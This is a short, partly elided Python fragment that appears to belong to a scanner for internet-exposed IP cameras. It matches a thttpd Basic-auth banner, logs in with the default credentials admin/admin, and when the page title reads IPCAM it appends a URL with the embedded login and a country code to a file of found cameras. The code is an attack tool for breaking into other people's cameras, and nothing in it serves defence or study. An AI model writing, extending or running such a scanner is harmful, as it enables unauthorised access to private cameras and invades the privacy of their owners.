...
SEARCH_FOR = 'Server: thttpd Basic realm="index.html"'
...
def test_cam (IP,PORT,CC):
	...
	try:
		response = session.get(URL, headers=headers, auth=HTTPBasicAuth("admin","admin"))
		if "<title>IPCAM</title>" in response.text:
			text_file = open("found.txt", "a")
			text_file.write("http://admin:admin@"+IP+":"+PORT+"/l -Country: "+CC+"\n")
			text_file.close()
